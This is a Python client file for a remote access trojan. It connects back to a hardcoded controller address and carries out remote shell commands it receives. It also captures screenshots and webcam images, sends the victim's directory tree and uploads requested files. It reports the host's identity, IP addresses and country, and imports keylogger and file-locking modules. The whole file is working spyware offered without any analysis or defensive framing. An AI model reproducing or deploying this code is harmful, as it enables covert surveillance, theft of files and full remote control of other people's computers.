# client.py
import socket
import threading
import os
import subprocess
import json
import io
import requests
import cv2
import pyautogui
from KeyLogger import KeyLog
from LockFile import LockFile

PORT = "192.168.1.36"
class Client:
    def __init__(self, host=PORT):
        self.host = host
        self.ports = {
            'shell': 5005,
            'keylogger': 5000,
            'file': 5050
        }
        self.buffer_size = 1024 * 128
        self.separator = "<sep>"

    def get_system_info(self):
        return {
            'hostname': socket.gethostname(),
            'local_ip': socket.gethostbyname(socket.gethostname()),
            'public_ip': requests.get('https://api.ipify.org?format=json').json()['ip'],
            'country': requests.get('https://ipinfo.io').json().get('country', 'Unknown')
        }

    def start_shell_client(self):
        s = socket.socket()
        s.connect((self.host, self.ports['shell']))
        
        # Send current working directory
        cwd = os.getcwd()
        s.send(cwd.encode())
        
        # Send system information
        info = self.get_system_info()
        info_str = f"{info['local_ip']}{self.separator}{info['hostname']}{self.separator}{info['country']}"
        s.send(info_str.encode())
        
        while True:
            try:
                command = s.recv(self.buffer_size).decode()
                if not command or command.lower() == 'exit':
                    break

                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        output = ""
                    except Exception as e:
                        output = str(e)
                elif command == 'src':
                    screenshot = pyautogui.screenshot()
                    img_bytes = io.BytesIO()
                    screenshot.save(img_bytes, format='PNG')
                    img_data = img_bytes.getvalue()
                    s.sendall(f"{len(img_data)}{self.separator}image".encode())
                    s.sendall(img_data)
                    output = ""
                elif command == 'webcam':
                    cap = cv2.VideoCapture(0)
                    if cap.isOpened():
                        ret, frame = cap.read()
                        if ret:
                            _, img_encoded = cv2.imencode('.png', frame)
                            img_bytes = img_encoded.tobytes()
                            s.sendall(f"{len(img_bytes)}{self.separator}image".encode())
                            s.sendall(img_bytes)
                            output = ""
                        else:
                            output = "Failed to capture image"
                    else:
                        output = "Cannot access webcam"
                    cap.release()
                else:
                    output = subprocess.getoutput(command)

                cwd = os.getcwd()
                message = f"{output}{self.separator}{cwd}"
                s.send(message.encode())
            except Exception as e:
                break
        s.close()

    def start_keylogger_client(self):
        s = socket.socket()
        s.connect((self.host, self.ports['keylogger']))
        # Implement keylogger functionality here
        while True:
            pass

    def start_file_client(self):
        s = socket.socket()
        s.connect((self.host, self.ports['file']))
        
        def get_directory_tree(path):
            tree = {}
            for entry in os.scandir(path):
                if entry.is_dir():
                    tree[entry.name] = get_directory_tree(entry.path)
                else:
                    tree[entry.name] = None
            return tree
        
        # Send initial directory tree
        tree = get_directory_tree(os.getcwd())
        tree_json = json.dumps(tree)
        s.send(tree_json.encode())
        s.send(b"<end>")
        
        while True:
            try:
                command = s.recv(self.buffer_size).decode()
                if not command:
                    break
                    
                parts = command.split(self.separator)
                if parts[0] == "download":
                    self.send_file(s, parts[1])
            except:
                break
        s.close()

    def send_file(self, socket, filepath):
        if not os.path.exists(filepath):
            return
            
        filename = os.path.basename(filepath)
        name_bytes = filename.encode('utf-8')
        socket.send(len(name_bytes).to_bytes(4, 'big'))
        socket.send(name_bytes)
        
        with open(filepath, 'rb') as f:
            while data := f.read(self.buffer_size):
                socket.sendall(data)
        socket.send(b"<end>")

    def start(self):
        threads = []
        for service in ['shell', 'keylogger', 'file']:
            thread = threading.Thread(target=getattr(self, f'start_{service}_client'))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        return threads

def main():
    client = Client()
    client_threads = client.start()
    
    # Wait for all threads to complete
    for thread in client_threads:
        thread.join()

if __name__ == "__main__":
    main()